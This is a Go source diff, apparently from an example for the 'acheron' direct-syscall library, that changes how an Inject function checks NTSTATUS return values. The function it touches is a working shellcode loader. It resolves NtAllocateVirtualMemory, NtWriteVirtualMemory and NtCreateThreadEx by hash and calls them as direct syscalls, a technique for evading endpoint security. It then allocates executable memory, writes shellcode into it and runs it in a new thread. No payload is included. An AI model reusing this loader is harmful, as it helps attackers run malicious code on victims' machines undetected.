@@ -10,13 +10,15 @@ import (
 	"golang.org/x/sys/windows"
 )
 
+var NT_SUCCESS = acheron.NT_SUCCESS
+
 func Inject(ach *acheron.Acheron, scBuf []byte) error {
 	fmt.Printf("[!] Using direct syscalls ...\n")
 
 	fmt.Printf("[+] Allocating memory with NtAllocateVirtualMemory ...\n")
 	scBufLen := len(scBuf)
 	s1, _ := ach.GetSyscall(ach.HashString("NtAllocateVirtualMemory"))
-	if err := execDirectSyscall(
+	if status := execDirectSyscall(
 		s1.SSN,
 		hSelf,
 		uintptr(unsafe.Pointer(&baseAddr)),
@@ -24,26 +26,26 @@ func Inject(ach *acheron.Acheron, scBuf []byte) error {
 		uintptr(unsafe.Pointer(&scBufLen)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_EXECUTE_READWRITE,
-	); err != NT_SUCCESS {
-		return fmt.Errorf("NtAllocateVirtualMemory failed: %d", err)
+	); !NT_SUCCESS(status) {
+		return fmt.Errorf("NtAllocateVirtualMemory failed: %d", status)
 	}
 
 	fmt.Printf("[+] Writing shellcode to memory ...\n")
 	s2, _ := ach.GetSyscall(ach.HashString("NtWriteVirtualMemory"))
-	if err := execDirectSyscall(
+	if status := execDirectSyscall(
 		s2.SSN,
 		hSelf,
 		uintptr(unsafe.Pointer(baseAddr)),
 		uintptr(unsafe.Pointer(&scBuf[0])),
 		uintptr(scBufLen),
 		0,
-	); err != NT_SUCCESS {
-		return fmt.Errorf("NtWriteVirtualMemory failed: %d", err)
+	); !NT_SUCCESS(status) {
+		return fmt.Errorf("NtWriteVirtualMemory failed: %d", status)
 	}
 
 	fmt.Printf("[+] Creating thread with NtCreateThreadEx ...\n")
 	s3, _ := ach.GetSyscall(ach.HashString("NtCreateThreadEx"))
-	if err := execDirectSyscall(
+	if status := execDirectSyscall(
 		s3.SSN,
 		uintptr(unsafe.Pointer(&hThread)),
 		windows.GENERIC_EXECUTE,
@@ -56,8 +58,8 @@ func Inject(ach *acheron.Acheron, scBuf []byte) error {
 		0,
 		0,
 		0,
-	); err != NT_SUCCESS {
-		return fmt.Errorf("NtCreateThreadEx failed: %d", err)
+	); !NT_SUCCESS(status) {
+		return fmt.Errorf("NtCreateThreadEx failed: %d", status)
 	}
 
 	windows.WaitForSingleObject(
